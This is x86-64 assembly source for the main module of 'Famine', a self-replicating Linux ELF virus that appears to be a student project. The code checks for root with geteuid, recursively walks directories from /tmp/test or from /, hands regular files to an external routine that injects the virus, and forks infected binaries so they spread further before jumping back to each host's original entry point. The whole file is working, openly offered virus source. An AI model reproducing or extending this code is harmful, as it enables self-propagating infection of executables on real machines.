;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; struct linux_dirent64 {													;
;	int64_t			d_ino;		// 64-bit inode number			| offset 0	;
;	int64_t			d_off;		// 64-bit offset to next struct	| offset 8	;
;	unsigned short	d_reclen;	// size of this dirent			| offset 16	;
;	unsigned char	d_type;		// File type					| offset 18	;
;	char			d_name[];	// file name					| offset 19	;
; }																			;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%define STACK_SIZE	(4096 * 1024)

section .text
	global _start
	global _string
	global _read_dir
	global _ft_strlen
	global _verif
	global _verify_o_entry
	global _continue_normaly
	extern _treat_file
	extern _final_end
	extern _thread_create
	extern _start_infect
	extern _infect_from_root
	extern _verify_starting_infect
	extern _famine_start_options
    extern _fork_before_exec_normaly

_o_entry:
	dq 0x0000000000000000 

_string:
	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0

;; Start of the program
_start:
	;; Create stack frame
	push	rbp
	mov		rbp, rsp
	sub		rsp, 16

	;; Save up all registers on stack
	push	rbx		; +8
	push	rcx		; +16
	push	rdx		; +24
	push	rsi		; +32
	push	rdi		; +40
	push	r8		; +48
	push	r9		; +56
	push	r10		; +64
	push	r11		; +72
	push	r12		; +80
	push	r13		; +88
	push	r14		; +96
	push	r15		; +104

	;; If _o_entry label equals zero, we are into ./famine so we look for eventual arguments
	lea		rax, [rel _o_entry]
	cmp		QWORD [rax], 0
	je		_famine_start_options

	;; --------------------------------------------------------------------------------------------
	;; NOTE
	;; --------------------------------------------------------------------------------------------
	;;
	;; There are two ways CLI arguments can be passed over to the program : via registers or via 
	;; the stack.
	;; We need to check both methods (offsets) to detect if we are using one or the other.
	;; 
	;; Via stack :
	;; 		- argc : %rsp + 128
	;; 		- argv : %rsp + 136
	;; 
	;; Via registers :
	;; 		- argc : %rsp + 64
	;; 		- argv : %rsp + 72
	;; 
	;; --------------------------------------------------------------------------------------------

	;; ** If argc equals 3 **
	;; In this alternative start, we determine if we run infection only and exit right after or
	;; if we run the infection and make the program continue until its natural end.
	
	;; (To know why some times we need to execute the infection only, refer to the commentaries in fork.s
	;; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv))
	cmp		QWORD [rsp + 128], 3				; if argc == 3
	je		_alternative_start

	;; ** If argc equals 4 **
	cmp		QWORD [rsp + 128], 4				; if argc == 4
	je		_verify_starting_infect

;; Check if program arguments are passed via registers
_check_registers:
	cmp		QWORD [rsp + 64], 3 				; if argc == 3
	je		_alternative_start_by_registers		; 
	
	lea		r10, [rel _o_entry]					; %r10 = _o_entry
	cmp		QWORD [r10] , 0						; if %r10 == 0
	jne		_test_root_infect					; try infection from root
	call	_start_infect						; 
	jmp		_continue_normaly

;; Check if we have rights to infect from root
_test_root_infect: 
	
	;; Geteuid syscall
	mov		rax, 107
	syscall

	;; If syscall returned 0 it means we are root
	cmp		rax, 0
	jne		_continue_normaly
    jmp     _fork_before_exec_normaly

;; If it's a normal execution, we just infect /tmp/test(2)
_continue_normaly:
	mov		rax, 0
	push	rax
	push	rax

; Here we check if their is a o_entry address. If so, we are in an infected binary,
; so we just infect /tmp/test(2), and execute the code normally.
; Else, we test for the privilege we have, and try to infect from / if we can
;	cmp QWORD [r10], 0 ; compare _o_entry with 0
;	jne _infect_tmp_test
;	mov rax, 107
;	syscall ; We call geteuid
;	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
;	jne _infect_tmp_test
;	mov rax, 0
;	jmp _push_it

_infect_tmp_test:
	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"

_push_it:
	push	rax								; push infection path on stack
	mov		rdi, rsp
	mov		rsi, rsp
	add		rsi, 16
	mov		rax, 1							; sets recursive infection
	push	rax
	push	rsi
	push	rdi
	call	_read_dir						; call our directory browsing function

	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
	call	_read_dir						; call our directory browsing function

;; Pop everything we just pushed
_jmp_end:
	pop		rdi
	pop		rdi
	pop		rdi
	pop		rdi
	pop		rdi
	pop		rdi

;; Check if we need to jump to continue program (./infected) or simply terminate (./famine)
_verify_o_entry:
	lea		rax, [rel _o_entry]
	cmp		QWORD [rax], 0
	jne		_jmp_to_o_entry

;; Exit program
_force_exit:
	mov		rax, 60						; sys_exit
	mov		rdi, 0						; exit with 0
	syscall


; In this alternative start, we know we have 3 arguments on the stacks, but we need to know
; if this is an infect only execution (we just run the infection, and then exit), or if we execute
; the binary after.
; To know why some times we need to execute the infection only, refer to the commentaries in fork.s
; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)

;; Start via stack
_alternative_start:
	mov		r10, QWORD [rsp + 144]		; argv[1]
	lea		r11, [rel _verif]			; relative address of _verif
	mov		r11, QWORD [r11]			; dereferencing
	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
	jne		_check_registers
	
	mov		rsi, QWORD [rsp + 152]		; take the argv[2]
	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
	push	rax
	push	rsi
	push	rax
	call	_read_dir

	pop rdi
	pop rdi
	pop rdi
	
	jmp _force_exit

; In this other alternative start, the arguments are received by registers. We pushed the registers to
; don't corrupt the normal execution, so we will find our arguments on the stack.

;; Start via registers
_alternative_start_by_registers:
	mov		r10, QWORD [rsp + 72]		; here we take argv
	mov		r10, QWORD [r10 + 8]		; argv is an array, so we take the index 1 (argv[1]).
	lea		r11, [rel _verif]			; relative address of _verif
	mov		r11, QWORD [r11]			; dereferencing
	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
	jne		_continue_normaly
	
	mov		rsi, QWORD [rsp + 72]		; take argv
	mov		rsi, QWORD [rsi + 16]		; take argv[2]
	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
	push	rax
	push	rsi
	push	rax
	call	_read_dir
	
	pop		rdi
	pop		rdi
	pop		rdi
	
	;; Load our exit address
	lea		rax, [rel _force_exit]

;; Jump back to old entry point
_jmp_to_o_entry: 
	;; Pop off the stack all the registers saved at the begining of the program
	pop		r15
	pop		r14
	pop		r13
	pop		r12
	pop		r11
	pop		r10
	pop		r9
	pop		r8
	pop		rdi
	pop		rsi
	pop		rdx
	pop		rcx
	pop		rbx

	;; Destroy stack frame
	leave

	;; Jump to old entry
	jmp		[rax]

;; --------------------------------------------------------------------------------------------
;; NAME
;;		read_dir
;;
;; SYNOPSYS
;;		void	read_dir(bool recur, char *actual_dir, char *path_of_dir)
;;
;; DESCRIPTION
;;		Runs an infection on the directory pointed by actual_dir at path_of_dir.
;;
;; NOTES
;;		This function has 2 behaviors according to the boolean value of recur.
;;		If recur is set to 1:
;;			It will infect one of the binaries located in this directory and then executes it
;;			into a fork with the _verif_argument.
;;
;;		Otherwise:
;;			It will ONLY infect all of the binaries located in THIS directory.
;;
;;		So our main exec will run the recursif mode, infect only 1 binary per directory
;;		and execute them. Then all the binary infected how will be executed will infect 
;;		all binaries on their current directory.
;;
;; STACK USAGE
;;		rsp + 0		: dir struct
;;		rsp + 280	: virus size
;;		rsp + 288	: fd directory
;;		rsp + 296	: pointer to current dir file
;;		rsp + 304	: buffer end address
;;		rsp + 312	: address dir name 1arg
;;		rsp + 320	: size arg 1
;;		rsp + 328	: size arg 2
;;		rsp + 336	: total size
;;		rsp + 344	: 2 arg
;;		rsp + 352	: nb_thread launched. UNUSED
;;		rsp + 360	: bool, indicating if a binary have already been infected in the current directory
;;		rsp + 368	: bool, enable recursif
;;		rsp - size	: size of total path for this dir
;; --------------------------------------------------------------------------------------------

_read_dir:
	;; Create stack frame
	enter	392, 0
	
	;; Access arguments passed via the stack
	mov		rdi, QWORD [rsp + 408]		; 3rd arg (char *path_to_dir)
	mov		rsi, QWORD [rsp + 416]		; 2nd arg (char *actual_dir)
	mov		rax, QWORD [rsp + 424]		; 1st arg (bool recur)

	;; Save up arguments
	mov		QWORD [rsp + 368], rax
	mov		QWORD [rsp + 312], rdi
	mov		QWORD [rsp + 344], rsi
	mov		QWORD [rsp + 360], 0

	;; Get directory name length
	mov		rdi, rsi
	call	_ft_strlen
	mov		QWORD [rsp + 328], rax
	
	;; Get directory path length
	mov		rdi, QWORD [rsp + 312]
	call	_ft_strlen
	mov		QWORD [rsp + 320], rax
	
	;; Compute full path length
	mov		r10, QWORD [rsp + 320]		; r10 = strlen(dirpath)
	mov		QWORD [rsp + 336], r10		; total length += r10
	mov		r10, QWORD [rsp + 328]		; r10 = strlen(dirname)
	add		QWORD [rsp + 336], r10		; total length += r10
	add		QWORD [rsp + 336], 2		; total length += 2 ('/' + '\0')

	;; --------------------------------------------------------------------------------------------
	;; NOTE
	;; --------------------------------------------------------------------------------------------
	;;
	;; We need a dynamic buffer to store our path concatenation ; keeping in mind that we cannot 
	;; touch %rsp because it will corrupt all of our stack offsets.
	;;
	;; We are going to write our path under the actual %rsp like so :
	;;
	;; -------------------------- 
	;; ;    TOP OF THE STACK    ;
	;; -------------------------- 
	;; ;          ...           ;
	;; -------------------------- 
	;; ;     Previous frame     ;
	;; -------------------------- < %rbp
	;; ;     Current frame      ;
	;; -------------------------- < %rsp
	;; ;    Our path string     ;
	;; --------------------------
	;; ;      Next fn call      ;
	;; --------------------------
	;; ;          ...           ;
	;; --------------------------
	;; ;   BOTTOM OF THE STACK  ;
	;; --------------------------
	;; 
	;; The problem is, on the next function call, it's relative stack frame might be overlapping
	;; our path string. To avoid that, we'll have to move our %rsp down by its length in bytes
	;; with a few tricks :
	;; 		- get the length of the string
	;; 		- move %rsp down by strlen + 8
	;; 		- use the extra 8 bytes to store strlen so when we return from our function call, 
	;; 		  we know exactly how many bytes we need to move up to retreive our inital frame
	;;
	;; --------------------------------------------------------------------------------------------

	;; Copy directory path
	mov		rdi, rsp					; move to %rsp
	sub		rdi, QWORD [rsp + 336]		; move under %rsp by total length
	mov		rsi, QWORD [rsp + 344]		; %rsi = directory path
	mov		rcx, QWORD [rsp + 328]		; %rcx = length of directory path
	cld
	rep		movsb						; copy directory path

	;; Copy '/'
	mov		rdi, rsp					; move to %rsp
	sub		rdi, QWORD [rsp + 336]		; move under %rsp by total length
	add		rdi, QWORD [rsp + 328]		; move up by length of directory path we just wrote
	mov		BYTE [rdi], 0x2f			; copy the '/'

	; Copy directory name
	add		rdi, 1						; move up 1 byte
	mov		rsi, QWORD [rsp + 312]		; %rsi = directory name
	mov		rcx, QWORD [rsp + 320]		; %rcx = length of directory name
	cld
	rep		movsb						; copy directory name

	; Copy '\0'
	mov		rdi, rsp					; move to %rsp
	sub		rdi, QWORD [rsp + 336]		; move under %rsp by total length
	add		rdi, QWORD [rsp + 328]		; move up by length of the directory path
	add		rdi, 1						; move up by 1 byte ('/')
	add		rdi, QWORD [rsp + 320]		; move up by length of the directory name
	mov		BYTE [rdi], 0				; copy the '\0'

;; Get the virus total length = (&_final_end + 2) - &_string
_calculate_virus_size:
	xor		r10, r10					; clear %r10
	lea		r10, [rel _final_end]		; %r10 = <addr _final_end>
	add		r10, 2						; final_end has 2 bytes of instrucitions
	xor		r11, r11					; clear %r11
	lea		r11, [rel _string]			; %r11 = <addr _string>
	sub		r10, r11					; <addr _final_end> -= <addr _string>
	mov		QWORD [rsp + 280], r10		; save up size

;; Open the directory from the path stored under our stack pointer
_open_dir:
	;; Setup values for sys_open
	mov		rdi, rsp					; %rdi = stack pointer
	mov		r10, QWORD [rsp + 336]		; %r10 = total path length
	sub		rdi, r10					; move %rdi under the stack pointer by %r10 bytes
	xor		rsi, rsi					; O_RDONLY flag
	xor		rdx, rdx					; unused flag
	mov		rax, 0x2					; sys_open number

	;; Setup stack frame before syscall
	mov		r10, QWORD [rsp + 336]		; %r10 = total length
	sub		rsp, r10					; move %rsp down total length bytes
	sub		rsp, 8						; move %rsp down 8 more bytes
	mov		QWORD [rsp], r10			; store at this offset the total length
	add		QWORD [rsp], 8				; add 8 more bytes to this value

	;; Call sys_open
	syscall

	;; Reset stack frame after syscall
	add		rsp, QWORD [rsp]			; move up %rsp by the number of bytes stored at this offset

	;; Check sys_open retval
	cmp		rax, -1						; if we have an error
	jle		_close_dir					; jump to _close_dir

	mov		QWORD [rsp + 288], rax		; otherwise save up file descriptor

;; This loop will get each file/directory at this location
_dir_loop:
	; Setup values for sys_getdents64
	mov		rdx, 280					; size of our buffer
	mov		rdi, QWORD [rsp + 288]		; mov the fd to the first argument
	mov		rsi, rsp					; mov the stack pointer to the second argument
	mov		rax, 217					; getdents64 syscall number

	;; Setup stack frame before syscall
	mov		r10, QWORD [rsp + 336]
	sub		rsp, r10
	sub		rsp, 8
	mov		QWORD [rsp], r10
	add		QWORD [rsp], 8
	
	;; Call sys_getdents64
	syscall
	
	;; Restore stack frame after syscall
	add		rsp, QWORD [rsp]

	;; Check sys_getdents64 retval
	cmp		rax, 0						; if we have an error or there is nothing more to read
	jle		_close_dir

	;; Set the theoric maximum address for the readed datas in our buffer
	mov		r10, rax 					; mov to r10 the number of bytes readed
	add		r10, rsp 					; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
	mov		QWORD [rsp + 304], r10
	mov		rsi, rsp					; initialize rsi with our buffer address on the stack
	mov		QWORD [rsp + 296], rsi		; 

;; Treat files/directories from buffer
_treat_data:
	;; Check if we are not too far in memory
	mov		r10, QWORD [rsp + 304]
	cmp		QWORD [rsp + 296], r10		; r10 is the address of the end of the buffer, so we check if our address is too far in memory
	jge		_dir_loop					; and we jump to read again the dir datas, to see if their is anothers datas to treat

	;; Check if it is a directory
	xor		r12, r12
	mov		r12b, BYTE [rsi + 18]
	cmp		r12, 4						; if d_type == DT_DIR
	je		_test_bool					; _recursiv_infect

	;; Check if it's a regular file
	xor		r12, r12
	mov		r12b, BYTE [rsi + 18]
	cmp		r12, 8						; if d_type != DT_REG
	jne		_continue					; ignore entry

	;; Check if we need to infect all binaries. We the recursif is not set, we infect all binaries
	cmp		QWORD [rsp + 368], 1
	jne		_treat_normally
	
	;; Check if we already infected a binary. if so, we need to know if we need to infect the others binaries
	cmp		QWORD [rsp + 360], 1
	je		_continue

;; This is the default routine
_treat_normally:
	add		rsi, 19						; d_name is at offset 19 in struct linux_dirent64
	mov		rdi, rsi
	mov		rsi, QWORD [rsp + 280]		; virus length
	mov		r10, QWORD [rsp + 336]		; total length
	mov		rdx, rsp

	;; Setup stack frame before function call 
	sub		rdx, r10
	sub		rsp, r10
	sub		rsp, 8
	mov		QWORD [rsp], r10
	add		QWORD [rsp], 8
	
	mov		r11, rsp
	add		r11, QWORD [r11]

; rsp + 368 will be at 0 when if we don't want to fork.
; So it will be set to 0 on child process launched to infect their actual directory only
; And it will be set to 1, for famine binary, and other binary launched by the user.
; Globally, it is set to 1 only for the process travelling all the directory recursively,
; where childs process only infect their actual directory
	mov		r10, 0						; We unset the recursif mode
	cmp		QWORD [r11 + 368], 1		; check if recursif mode is activated
	jne		_call_treat_file
	mov		r10, 1						; we set the recursif mode

_call_treat_file:
	call _treat_file
	
	;; Restore stack frame after function call
	add rsp, QWORD [rsp]
	
	;; If we didn't forked, we just continue normally
	cmp		rax, 0 
	je		_continue

	;; If we forked, we set a boolean value to know we already infected a binary in that directory
	mov		QWORD [rsp + 360], 1 
	jmp		_continue

_test_bool:
	cmp		QWORD [rsp + 368], 1 ; check if we need to infect in recursiv
	jne		_continue

_recursiv_infect:
	mov rsi, QWORD [rsp + 296] ; actual file/dir struct
	add rsi, 19 ; offset of file/dir name
	cmp WORD [rsi], 0x002e ; check if file name is .
	je _continue
	cmp WORD [rsi], 0x002e2e ; check if file name is ..
	je _continue
	mov rdi, QWORD [rsp + 296]
	add rdi, 19
	mov rsi, rsp
	mov r10, QWORD [rsp + 336] 
		sub rsi, r10
		sub rsp, r10
		sub rsp, 8
		mov QWORD [rsp], r10
		add QWORD [rsp], 8
	mov rax, 1 ; continue to infect in recursiv mode
	push rax
	push rsi
	push rdi
	call _read_dir ; here we call in recursif
	pop rdi
	pop rdi
	pop rdi
		add rsp, QWORD [rsp]
	jmp _continue

;; Reinit/increment registers/stack variable for next loop
_continue:
	mov		rsi, [rsp + 296]			; take our actual file/dir struct
	xor		r11, r11
	mov		r11w, WORD [rsi + 16]		; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
	add		rsi, r11					; we add this len on our current struct address to access next struct
	mov		QWORD [rsp + 296], rsi
	jmp		_treat_data

;; Close directory
_close_dir:
	mov		rax, 3						; sys_close number
	mov		rdi, QWORD [rsp + 288]		; directory fd
	syscall

_end_ret:
	leave
	ret

;; --------------------------------------------------------------------------------------------
;; NAME
;;		ft_strlen
;;
;; SYNOPSYS
;;		size_t	ft_strlen(char *s)
;;
;; DESCRIPTION
;;		Returns the length in byte of the string pointed by s
;; --------------------------------------------------------------------------------------------

_ft_strlen: 
	enter	16, 0
	xor		rax, rax
	mov		rbx, rdi
	cmp		rdi, 0
	je		_strlen_end
	mov		rcx, -1
	cld
	repne	scasb
	sub		rdi, rbx
	mov		rax, rdi
	sub		rax, 1
_strlen_end:
	leave
	ret

; Here is our verif code
_verif:
	dq 0x1122334455667788
